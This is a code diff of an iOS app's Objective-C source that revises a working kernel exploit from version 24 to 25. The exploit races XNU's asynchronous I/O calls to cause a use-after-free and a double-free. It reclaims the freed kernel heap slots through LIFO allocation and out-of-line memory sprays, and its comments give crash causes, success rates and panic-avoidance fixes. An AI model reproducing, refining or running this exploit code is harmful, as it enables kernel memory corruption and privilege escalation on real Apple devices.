@@ -356,7 +356,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5723,7 +5723,7 @@ static void *e2_free_and_ool_racer(void *arg) {
 // Leaks kernel heap address via kevent64 ident field.
 
 - (void)aioUafTapped {
-    // v24: Strong re-entrancy guard — @synchronized only wraps debounce,
+    // v25: Strong re-entrancy guard — @synchronized only wraps debounce,
     // but static flag prevents any possibility of concurrent execution.
     static volatile int32_t _aioRunning = 0;
     if (!__sync_bool_compare_and_swap(&_aioRunning, 0, 1)) {
@@ -5742,7 +5742,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v24 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v25 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5761,7 +5761,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5776,18 +5776,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     static struct aiocb rcbs[AIO_NRECLAIM];
     static char rbufs[AIO_NRECLAIM][8192];   // exact fit for 0x2000 nbytes
 
-    // ---- Phase A: Double-free via AIO kevent UAF ----
-    // FILE STRATEGY: Racer thread frees trigger between lio_listio's
-    // enqueue and kevent register, then reclaims same slot via LIFO.
-    // ~70% success, ~30% kernel panic (FAR=0x58) when reclaim misses the slot.
-    // Safety: close kq BEFORE aio_return on "race lost" path.
-    //          Leak kq (don't close) on "freed but no reclaim" path.
+    // ---- Phase A: Double-free via AIO use-after-free + LIFO reclaim ----
+    // v25: SIGEV_NONE trigger — NO kevent, NO kqueue, NO knote, NO filt_aioprocess.
+    // The crash in v19-v24 was ALWAYS filt_aioprocess dereferencing procp=0
+    // from a freed+reallocated entry slot via the dangling knote.
+    // Without SIGEV_KEVENT, no knote is ever created → crash vector eliminated.
+    //
+    // Mechanism: tcb (SIGEV_NONE) completes → aio_entry_unref → zfree(slot S)
+    // Racer calls aio_return(&tcb) → TAILQ_REMOVE from doneq (dangling entry)
+    // → aio_read(&rcbs[0]) → zalloc reclaims slot S via LIFO.
+    // Double-free confirmed via aio_error(&tcb)==EINVAL after reclaim.
 
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"Phase A attempt %d/5", attempt + 1]];
-
-        int kq = kqueue();
-        if (kq < 0) { [self appendLog:@"kqueue failed"]; continue; }
 
         static struct aiocb tcb;
         static char tbuf[4096];
@@ -5797,9 +5798,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_nbytes = sizeof(tbuf);
         tcb.aio_offset = 0;
         tcb.aio_lio_opcode = LIO_READ;
-        tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
-        tcb.aio_sigevent.sigev_signo = kq;
-        tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
+        tcb.aio_sigevent.sigev_notify = SIGEV_NONE;  // v25: NO kevent → no kq needed
 
         for (int i = 0; i < AIO_NRECLAIM; i++) {
             memset(&rcbs[i], 0, sizeof(rcbs[i]));
@@ -5832,20 +5831,16 @@ static void *e2_free_and_ool_racer(void *arg) {
         bool reclaimed = atomic_load(&rs.reclaim_done);
 
         if (freed == 0) {
-            // Close kq BEFORE aio_return — while entry is still valid.
-            // If we free first, knote points to freed memory and close(kq)
-            // triggers filt_aiodetach → use-after-free → kernel panic.
-            close(kq);
+            // Race lost — tcb didn't complete within 500us window.
             while (aio_error(&tcb) == EINPROGRESS) usleep(500);
             aio_return(&tcb);
             [self appendLog:@"  race lost, retrying"];
             continue;
         }
         if (!reclaimed) {
-            // Entry already freed by racer. knote is dangling.
-            // close(kq) would trigger filt_aiodetach on freed memory → panic.
-            // Leak the kqueue in this case.
-            [self appendLog:[NSString stringWithFormat:@"  freed but no reclaim, leaking kq=%d", kq]];
+            // Freed but reclaim failed — slot S not reclaimed by rcbs[0].
+            // Unusual, but safe to retry.
+            [self appendLog:@"  freed but no reclaim, retrying"];
             continue;
         }
 
@@ -5853,51 +5848,33 @@ static void *e2_free_and_ool_racer(void *arg) {
         for (int i = 0; i < AIO_NRECLAIM; i++)
             while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-        // Drain kqueue → filt_aioprocess on reclaimed entry → double-free
-        struct kevent64_s kev = {};
-        struct timespec ts = {10, 0};
-        int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+        // v25: Confirm double-free via aio_error status (NO kevent64!)
+        // aio_error(&tcb): if tcb was freed+reclaimed, uaiocbp won't match
+        // any entry on doneq/activeq → EINVAL.
+        // aio_error(&rcbs[0]): rcbs[0] completed → errorval on doneq.
+        int tcb_err = aio_error(&tcb);
+        int rcb0_err = aio_error(&rcbs[0]);
+        [self appendLog:[NSString stringWithFormat:@"  aio_error(tcb)=%d aio_error(rcbs[0])=%d", tcb_err, rcb0_err]];
 
-        if (nev > 0) {
-            [self appendLog:@"*** PHASE A: DOUBLE-FREE ACHIEVED ***"];
-            [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx (kernel heap addr)", kev.ident]];
-            [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx (errorval)", kev.ext[0]]];
-            [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (returnval)", kev.ext[1]]];
-            if (kev.ext[1] == 0x2000) {
-                [self appendLog:@"  >> CONFIRMED: ext[1] from reclaim (nbytes=0x2000) <<"];
-                [self appendLog:@"  >> ext[1] is CONTROLLABLE via aio_nbytes <<"];
-            } else if (kev.ext[1] == 0x1000) {
-                [self appendLog:@"  >> ext[1]=0x1000 from trigger (reclaim may have missed slot) <<"];
-            }
-            self.leakedKernelAddr = kev.ident;
-            [self appendLog:[NSString stringWithFormat:@"  leaked kernel addr: 0x%llx", self.leakedKernelAddr]];
-
-            // v22: FORWARD cleanup — free rcbs[0] FIRST (the double-free),
-            // then rcbs[1..6]. Forward order prevents close(kq) from
-            // dereferencing a dangling knote after timeout-path frees.
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
-                if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
-            }
-            close(kq);
-            break;  // SUCCESS
-        } else {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
-            // v23: LEAK kq on timeout — kevent64 didn't consume the knote,
-            // so close(kq) would call filt_aiodetach on dangling knote → crash.
-            // Forward cleanup frees reclaim entries, then we leak the kq.
-            // This is the same strategy as "freed but no reclaim" path.
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
-                if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
-            }
-            [self appendLog:[NSString stringWithFormat:@"  leaking kq=%d (knote still registered)", kq]];
+        if (tcb_err == EINVAL && rcb0_err == 0) {
+            [self appendLog:@"*** PHASE A: DOUBLE-FREE CONFIRMED ***"];
+            [self appendLog:@"  >> tcb freed+reclaimed (not found on any queue) <<"];
+            [self appendLog:@"  >> rcbs[0] occupies reclaimed slot (valid on doneq) <<"];
+        } else if (tcb_err == 0) {
+            [self appendLog:@"  >> tcb still on doneq — reclaim missed slot <<"];
         }
+
+        // FORWARD cleanup — free reclaim entries
+        for (int i = 0; i < AIO_NRECLAIM; i++) {
+            if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
+        }
+        break;  // SUCCESS — proceed to Phase D
     }
 
-    // v24: RESTORE health check — v20 was the only version that didn't crash.
-    // The 4 alloc+free cycles consume corrupted freelist entries and give the
-    // kernel worker threads time to finish AIO cleanup before Phase D.
-    // Skipping this in v21-v23 caused ALL versions to crash identically.
-    [self appendLog:@"\n--- Health check (v20 restore) ---"];
+    // ---- Health check: consume corrupted freelist entries ----
+    // 4 alloc+free cycles give kernel worker threads time to finish
+    // AIO cleanup and consume any corrupted freelist entries.
+    [self appendLog:@"\n--- Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5919,13 +5896,14 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  health check: %d/4 ok", hc_ok]];
     }
 
-    // ---- v22: 20x OOL spray (NO drain) + FORWARD cleanup ----
-    // Forward Phase A cleanup fixes the v21 crash (dangling knote in close(kq)).
-    // Y's two copies on freelist: [Y-second, rcbs[1..6], Y-first].
-    // E2 takes Y-second; 20 OOL sprays sweep through rcbs[1..6] → hit Y-first.
-    // aio_error ONLY (no aio_return) to avoid procp crash on overlapped entry.
+    // ---- Phase D: OOL spray for double-free overlap ----
+    // E2 (SIGEV_NONE) allocates from freelist. If the double-free corrupted
+    // the freelist to make slot S appear twice, E2 gets one copy and OOL
+    // spray gets the other → OVERLAP. aio_error reads errorval through
+    // the overlapped slot (byte-offset payload).
+    // NO kevent, NO aio_return on overlapped entry → no crash.
 
-    [self appendLog:@"\n--- Phase D v22: 20x OOL spray (no drain) ---"];
+    [self appendLog:@"\n--- Phase D v25: 20x OOL spray ---"];
 
     // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
@@ -6048,12 +6026,11 @@ static void *e2_free_and_ool_racer(void *arg) {
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
-            // v24: Reset re-entrancy guard
+    [self appendLog:@"========== AIO Double-Free v25 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
